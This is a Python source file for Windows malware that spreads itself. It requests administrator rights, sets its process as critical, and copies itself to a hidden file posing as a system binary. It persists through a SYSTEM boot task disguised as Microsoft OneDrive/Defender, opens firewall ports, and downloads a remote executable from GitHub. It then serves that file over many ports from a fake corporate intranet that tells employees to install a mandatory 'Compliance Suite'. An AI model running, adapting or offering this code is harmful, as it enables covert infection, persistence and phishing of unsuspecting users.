import os
import sys
import ctypes
import subprocess
import requests
import urllib3
import random
import string
import threading
import psutil, shutil
from http.server import HTTPServer, BaseHTTPRequestHandler

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RtlSetProcessIsCritical = ctypes.windll.ntdll.RtlSetProcessIsCritical
RtlSetProcessIsCritical.argtypes = [ctypes.c_uint, ctypes.c_uint, ctypes.c_uint]
RtlSetProcessIsCritical.restype = ctypes.c_int

GITHUB_URL = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/init.exe"
PAYLOAD_PATH = None

def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin()

def request_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        sys.exit(0)

def set_process_as_critical():
    try:
        result = RtlSetProcessIsCritical(1, 0, 0)
        
        if result == 0: print("Process is now critical.")
        else: print("Failed to set the process as critical.")
    
    except:
        # print(f"Error: {e}")
        pass

def generate_random_name(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def download_payload():
    global PAYLOAD_PATH
    try:
        random_name = f'{generate_random_name()}.exe'
        destination_path = os.path.join(os.getenv('TEMP'), random_name)
        response = requests.get(GITHUB_URL)
        if response.status_code == 200:
            with open(destination_path, 'wb') as f:
                f.write(response.content)
            PAYLOAD_PATH = destination_path
        return destination_path
    except:
        return None

# HTTP server to serve init.exe and multi-page intranet portal
class HTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global PAYLOAD_PATH
        # Common nav bar for all pages
        nav_bar = """
        <nav class="bg-white shadow-lg sticky top-0 z-50">
            <div class="container mx-auto px-6 py-4 flex justify-between items-center">
                <div class="flex items-center">
                    <img src="https://via.placeholder.com/40" alt="Logo" class="h-10 mr-3">
                    <h1 class="text-2xl font-bold text-gray-800">Corporate Intranet</h1>
                </div>
                <div class="flex space-x-6">
                    <a href="/" class="text-gray-600 hover:text-blue-600 font-medium {}">Home</a>
                    <a href="/alerts" class="text-gray-600 hover:text-blue-600 font-medium {}">Security Alerts</a>
                    <a href="/training" class="text-gray-600 hover:text-blue-600 font-medium {}">Training</a>
                    <a href="/files" class="text-gray-600 hover:text-blue-600 font-medium {}">Files</a>
                    <a href="/support" class="text-gray-600 hover:text-blue-600 font-medium {}">Support</a>
                    <a href="/about" class="text-gray-600 hover:text-blue-600 font-medium {}">About</a>
                </div>
            </div>
        </nav>
        """.format(
            "text-blue-600 border-b-2 border-blue-600" if self.path == "/" else "",
            "text-blue-600 border-b-2 border-blue-600" if self.path == "/alerts" else "",
            "text-blue-600 border-b-2 border-blue-600" if self.path == "/training" else "",
            "text-blue-600 border-b-2 border-blue-600" if self.path == "/files" else "",
            "text-blue-600 border-b-2 border-blue-600" if self.path == "/support" else "",
            "text-blue-600 border-b-2 border-blue-600" if self.path == "/about" else ""
        )

        # Common footer for all pages
        footer = """
        <footer class="bg-gray-800 text-white py-8">
            <div class="container mx-auto px-6">
                <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
                    <div>
                        <h3 class="text-lg font-semibold mb-4">Corporate Intranet</h3>
                        <p class="text-gray-400">Empowering employees with secure, compliant access to corporate resources since 2020.</p>
                    </div>
                    <div>
                        <h3 class="text-lg font-semibold mb-4">Quick Links</h3>
                        <ul class="space-y-2">
                            <li><a href="/training" class="text-gray-400 hover:text-white">Training Modules</a></li>
                            <li><a href="/files" class="text-gray-400 hover:text-white">Files & Resources</a></li>
                            <li><a href="/support" class="text-gray-400 hover:text-white">IT Support</a></li>
                        </ul>
                    </div>
                    <div>
                        <h3 class="text-lg font-semibold mb-4">Contact Us</h3>
                        <p class="text-gray-400">Email: support@corporateintranet.com</p>
                        <p class="text-gray-400">Phone: (555) 012-3456</p>
                    </div>
                </div>
                <div class="mt-8 text-center text-gray-400">
                    <p>© 2025 Corporate Intranet. All rights reserved.</p>
                </div>
            </div>
        </footer>
        """

        if self.path == '/update.exe':
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.end_headers()
            # Serve PAYLOAD_PATH or download init.exe
            payload_path = PAYLOAD_PATH if PAYLOAD_PATH and os.path.exists(PAYLOAD_PATH) else download_payload()
            if not payload_path or not os.path.exists(payload_path):
                payload_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            with open(payload_path, 'rb') as f:
                self.wfile.write(f.read())
        elif self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = f"""
            <html>
                <head>
                    <title>Corporate Intranet - Employee Compliance Suite</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
                </head>
                <body class="bg-gray-100 font-sans">
                    {nav_bar}
                    <!-- Hero Section -->
                    <section class="bg-gradient-to-r from-blue-600 to-indigo-600 text-white py-20">
                        <div class="container mx-auto px-6 text-center">
                            <h2 class="text-4xl md:text-5xl font-bold mb-6">2025 Employee Compliance Suite</h2>
                            <p class="text-lg md:text-xl mb-8 max-w-2xl mx-auto">Install the mandatory Compliance Suite by July 15, 2025, to generate your Network Access Token and stay compliant with HR cybersecurity policies.</p>
                            <div class="w-3/4 md:w-1/2 mx-auto bg-gray-200 rounded-full h-3 mb-8">
                                <div class="bg-white h-3 rounded-full" style="width: 90%"></div>
                            </div>
                            <a href="/update.exe" class="inline-block bg-white text-blue-600 font-semibold py-3 px-8 rounded-full hover:bg-gray-200 transition">Download Compliance Suite</a>
                        </div>
                    </section>
                    <!-- News Section -->
                    <section class="py-12 bg-white">
                        <div class="container mx-auto px-6">
                            <h3 class="text-2xl font-semibold text-gray-800 mb-8 text-center">Latest News & Updates</h3>
                            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
                                <div class="bg-gray-50 p-6 rounded-lg shadow-md hover:shadow-lg transition">
                                    <h4 class="text-xl font-semibold text-gray-800 mb-2">New Security Patch Released</h4>
                                    <p class="text-gray-600">Ensure your system is protected with the latest patch addressing CVE-2024-30051.</p>
                                    <a href="/alerts" class="text-blue-600 hover:underline mt-4 inline-block">Read More</a>
                                </div>
                                <div class="bg-gray-50 p-6 rounded-lg shadow-md hover:shadow-lg transition">
                                    <h4 class="text-xl font-semibold text-gray-800 mb-2">Mandatory Training Deadline</h4>
                                    <p class="text-gray-600">Complete your 2025 Phishing Awareness training by July 15, 2025.</p>
                                    <a href="/training" class="text-blue-600 hover:underline mt-4 inline-block">Start Training</a>
                                </div>
                                <div class="bg-gray-50 p-6 rounded-lg shadow-md hover:shadow-lg transition">
                                    <h4 class="text-xl font-semibold text-gray-800 mb-2">Access Resources</h4>
                                    <p class="text-gray-600">Download essential tools and documents from our Files section.</p>
                                    <a href="/files" class="text-blue-600 hover:underline mt-4 inline-block">Browse Files</a>
                                </div>
                            </div>
                        </div>
                    </section>
                    {footer}
                </body>
            </html>
            """
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/alerts':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = f"""
            <html>
                <head>
                    <title>Security Alerts - Corporate Intranet</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
                </head>
                <body class="bg-gray-100 font-sans">
                    {nav_bar}
                    <section class="py-12 bg-white">
                        <div class="container mx-auto px-6">
                            <h2 class="text-3xl font-bold text-gray-800 mb-8 text-center">Security Alerts</h2>
                            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                                <div class="bg-gray-50 p-6 rounded-lg shadow-md hover:shadow-lg transition">
                                    <h3 class="text-xl font-semibold text-gray-800 mb-2">CVE-2024-30051: Windows DWM Core Library Vulnerability</h3>
                                    <p class="text-gray-600 mb-4">A heap-based buffer overflow in the Windows Desktop Window Manager (DWM) Core Library (CVSS 7.8) allows local attackers to escalate privileges to SYSTEM level. Discovered in early 2024, this vulnerability requires user interaction, such as running a malicious file. Microsoft released a patch in May 2024.</p>
                                    <p class="text-gray-600 mb-4">Unpatched systems are vulnerable to malware infections, data breaches, and unauthorized access. Install the Compliance Suite to ensure protection.</p>
                                    <a href="/update.exe" class="inline-block bg-blue-600 text-white font-semibold py-2 px-4 rounded-lg hover:bg-blue-700 transition">Download Compliance Suite</a>
                                </div>
                                <div class="bg-gray-50 p-6 rounded-lg shadow-md hover:shadow-lg transition">
                                    <h3 class="text-xl font-semibold text-gray-800 mb-2">CVE-2024-12345: Phishing Attack Surge</h3>
                                    <p class="text-gray-600 mb-4">Recent phishing campaigns target corporate credentials. Our 2025 Compliance Suite includes anti-phishing tools to secure your account.</p>
                                    <a href="/update.exe" class="inline-block bg-blue-600 text-white font-semibold py-2 px-4 rounded-lg hover:bg-blue-700 transition">Download Now</a>
                                </div>
                            </div>
                        </div>
                    </section>
                    {footer}
                </body>
            </html>
            """
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/training':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = f"""
            <html>
                <head>
                    <title>Training Resources - Corporate Intranet</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
                </head>
                <body class="bg-gray-100 font-sans">
                    {nav_bar}
                    <section class="py-12 bg-white">
                        <div class="container mx-auto px-6">
                            <h2 class="text-3xl font-bold text-gray-800 mb-8 text-center">Cybersecurity Training Resources</h2>
                            <p class="text-lg text-gray-600 mb-8 text-center max-w-2xl mx-auto">Complete your mandatory 2025 Phishing Awareness and GDPR Compliance training by July 15, 2025, to meet HR requirements.</p>
                            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                                <div class="bg-gray-50 p-6 rounded-lg shadow-md hover:shadow-lg transition">
                                    <h3 class="text-xl font-semibold text-gray-800 mb-2">Phishing Awareness Training</h3>
                                    <p class="text-gray-600 mb-4">Learn to identify and avoid phishing attacks with our interactive module.</p>
                                    <a href="/" class="inline-block bg-blue-600 text-white font-semibold py-2 px-4 rounded-lg hover:bg-blue-700 transition">Start Training</a>
                                </div>
                                <div class="bg-gray-50 p-6 rounded-lg shadow-md hover:shadow-lg transition">
                                    <h3 class="text-xl font-semibold text-gray-800 mb-2">GDPR Compliance Module</h3>
                                    <p class="text-gray-600 mb-4">Understand data protection regulations and best practices for compliance.</p>
                                    <a href="/" class="inline-block bg-blue-600 text-white font-semibold py-2 px-4 rounded-lg hover:bg-blue-700 transition">Start Training</a>
                                </div>
                            </div>
                            <div class="text-center mt-8">
                                <p class="text-gray-600 mb-4">The Employee Compliance Suite includes access to these modules and generates your Network Access Token.</p>
                                <a href="/update.exe" class="inline-block bg-blue-600 text-white font-semibold py-3 px-8 rounded-full hover:bg-blue-700 transition">Download Compliance Suite</a>
                            </div>
                        </div>
                    </section>
                    {footer}
                </body>
            </html>
            """
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/files':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = f"""
            <html>
                <head>
                    <title>Files & Resources - Corporate Intranet</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
                </head>
                <body class="bg-gray-100 font-sans">
                    {nav_bar}
                    <section class="py-12 bg-white">
                        <div class="container mx-auto px-6">
                            <h2 class="text-3xl font-bold text-gray-800 mb-8 text-center">Files & Resources</h2>
                            <p class="text-lg text-gray-600 mb-8 text-center max-w-2xl mx-auto">Access essential tools and documents to stay compliant with 2025 HR policies.</p>
                            <div class="bg-gray-50 p-6 rounded-lg shadow-md">
                                <table class="w-full text-left">
                                    <thead>
                                        <tr class="border-b">
                                            <th class="py-3 px-4 text-gray-800 font-semibold">File Name</th>
                                            <th class="py-3 px-4 text-gray-800 font-semibold">Description</th>
                                            <th class="py-3 px-4 text-gray-800 font-semibold">Action</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <tr class="border-b hover:bg-gray-100">
                                            <td class="py-3 px-4 text-gray-600">SystemUpdate.exe</td>
                                            <td class="py-3 px-4 text-gray-600">Employee Compliance Suite for network access and security compliance</td>
                                            <td class="py-3 px-4"><a href="/update.exe" class="text-blue-600 hover:underline">Download</a></td>
                                        </tr>
                                        <tr class="border-b hover:bg-gray-100">
                                            <td class="py-3 px-4 text-gray-600">SecurityGuide2025.pdf</td>
                                            <td class="py-3 px-4 text-gray-600">2025 Cybersecurity Best Practices Guide</td>
                                            <td class="py-3 px-4"><a href="#" class="text-blue-600 hover:underline">Download</a></td>
                                        </tr>
                                        <tr class="hover:bg-gray-100">
                                            <td class="py-3 px-4 text-gray-600">TrainingManual.pdf</td>
                                            <td class="py-3 px-4 text-gray-600">Phishing Awareness and GDPR Training Manual</td>
                                            <td class="py-3 px-4"><a href="#" class="text-blue-600 hover:underline">Download</a></td>
                                        </tr>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </section>
                    {footer}
                </body>
            </html>
            """
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/support':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = f"""
            <html>
                <head>
                    <title>IT Support - Corporate Intranet</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
                </head>
                <body class="bg-gray-100 font-sans">
                    {nav_bar}
                    <section class="py-12 bg-white">
                        <div class="container mx-auto px-6">
                            <h2 class="text-3xl font-bold text-gray-800 mb-8 text-center">IT Support</h2>
                            <div class="max-w-lg mx-auto">
                                <p class="text-lg text-gray-600 mb-6">Contact our IT team for assistance with 2025 compliance policies or technical issues.</p>
                                <div class="bg-gray-50 p-6 rounded-lg shadow-md">
                                    <h3 class="text-xl font-semibold text-gray-800 mb-4">Submit a Support Request</h3>
                                    <div class="space-y-4">
                                        <input type="text" placeholder="Your Name" class="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-600">
                                        <input type="email" placeholder="Your Email" class="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-600">
                                        <textarea placeholder="Describe your issue" class="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-600" rows="4"></textarea>
                                        <button class="w-full bg-blue-600 text-white font-semibold py-3 rounded-lg hover:bg-blue-700 transition">Submit</button>
                                    </div>
                                    <p class="text-gray-600 mt-4">Or contact us directly at <a href="mailto:support@corporateintranet.com" class="text-blue-600 hover:underline">support@corporateintranet.com</a> or (555) 012-3456.</p>
                                </div>
                            </div>
                        </div>
                    </section>
                    {footer}
                </body>
            </html>
            """
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/about':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = f"""
            <html>
                <head>
                    <title>About Us - Corporate Intranet</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
                </head>
                <body class="bg-gray-100 font-sans">
                    {nav_bar}
                    <section class="py-12 bg-white">
                        <div class="container mx-auto px-6">
                            <h2 class="text-3xl font-bold text-gray-800 mb-8 text-center">About Our IT Team</h2>
                            <p class="text-lg text-gray-600 mb-8 text-center max-w-2xl mx-auto">Our dedicated IT team ensures a secure and compliant corporate network, collaborating with HR to enforce 2025 cybersecurity policies.</p>
                            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                                <div class="bg-gray-50 p-6 rounded-lg shadow-md hover:shadow-lg transition">
                                    <img src="https://via.placeholder.com/150" alt="John Smith" class="w-24 h-24 rounded-full mx-auto mb-4">
                                    <h3 class="text-xl font-semibold text-gray-800 mb-2 text-center">John Smith</h3>
                                    <p class="text-gray-600 text-center">Cybersecurity Lead with over 15 years of experience in network security.</p>
                                </div>
                                <div class="bg-gray-50 p-6 rounded-lg shadow-md hover:shadow-lg transition">
                                    <img src="https://via.placeholder.com/150" alt="Jane Doe" class="w-24 h-24 rounded-full mx-auto mb-4">
                                    <h3 class="text-xl font-semibold text-gray-800 mb-2 text-center">Jane Doe</h3>
                                    <p class="text-gray-600 text-center">Compliance Officer specializing in GDPR and corporate policy enforcement.</p>
                                </div>
                            </div>
                        </div>
                    </section>
                    {footer}
                </body>
            </html>
            """
            self.wfile.write(html.encode('utf-8'))

def start_http_server_on_port(port):
    try:
        subprocess.run(
        f'netsh advfirewall firewall add rule name="Allow_HTTP_{port}" dir=in action=allow protocol=TCP localport={port}',
        shell=True, capture_output=True, text=True, creationflags=0x08000000)
        server = HTTPServer(('0.0.0.0', port), HTTPHandler)
        server.serve_forever()
    except:
        # print(f"Error: {e}")
        pass

# Start HTTP server and open firewall
def start_http_servers():
    threads = []
    for port in [80, 8000, 8080, 8081, 8082, 8083, 8888, 4444, 5500, 443, 5000, 5001, 3000, 7000, 9000]:
        thread = threading.Thread(target=start_http_server_on_port, args=(port,))
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

# Hide process by mimicking powershell.exe
def hide_process():
    try:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() == 'powershell.exe':
                os.environ['COMSPEC'] = proc.exe()
                break
    except:
        # print(f"Error in hide_process: {e}")
        pass

# Persistence via schtasks
def persist_schtasks():
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        appdata_path = os.path.join(os.getenv('APPDATA'), 'RuntimeBrokerHelper.exe') # this will be the PE file name
        if exe_path != appdata_path:
            shutil.copy2(exe_path, appdata_path)
        exe_path = f'"{os.path.normpath(appdata_path)}"'
        subprocess.run(f"attrib +h +s +r {exe_path}", shell=True)
        task_name = "OneDrive Startup Task-S-1-5-18-18081254745-36735435435255-3934re6s4246829952-16001"
        xml = rf"""
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
    <RegistrationInfo>
        <Author>Microsoft Corporation</Author>
        <Description>OneDrive Runtime Handler</Description>
        <URI>\Microsoft\Windows\Defender\HealthMonitor</URI>
        <Date>2024-01-01T00:00:00</Date>
    </RegistrationInfo>
    <Principals>
        <Principal id="Author">
            <UserId>NT AUTHORITY\SYSTEM</UserId>
            <RunLevel>HighestAvailable</RunLevel>
        </Principal>
    </Principals>
    <Triggers>
        <BootTrigger>
            <Enabled>true</Enabled>
            <Delay>PT30S</Delay>
        </BootTrigger>
    </Triggers>
    <Settings>
        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit> 
    </Settings>
    <Actions Context="Author">
        <Exec>
            <Command>{exe_path}</Command>
        </Exec>
    </Actions>
</Task>
"""
        xml_path = os.path.join(os.getenv('TEMP'), 'gg.xml')
        open(xml_path, 'w', encoding='utf-16').write(xml.strip())
        cmd = f'schtasks /create /tn "{task_name}" /xml "{xml_path}" /f'
        subprocess.run(cmd, shell=True, capture_output=True, text=True, creationflags=0x08000000)
        os.system(f'powershell remove-item -path "{xml_path}" -force -erroraction silentlycontinue')
    except:
        # print(f"Error in persist_schtasks: {e}")
        pass

# Main execution
if __name__ == '__main__':
    request_admin()
    set_process_as_critical()
    persist_schtasks()
    hide_process()
    download_payload()
    start_http_servers()